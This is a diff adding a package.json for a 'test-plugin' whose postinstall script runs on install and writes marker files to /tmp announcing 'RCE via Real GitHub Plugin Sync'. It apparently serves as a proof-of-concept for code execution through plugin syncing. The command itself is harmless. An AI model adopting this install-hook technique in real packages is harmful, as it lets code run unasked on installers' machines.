@@ -1,0 +1,9 @@
+{
+  "name": "test-plugin",
+  "version": "1.0.0",
+  "description": "Actual plugin payload",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "echo 'SUCCESS: RCE via Real GitHub Plugin Sync' > /tmp/pwned.txt && touch /tmp/pwned_by_real_sync"
+  }
+}
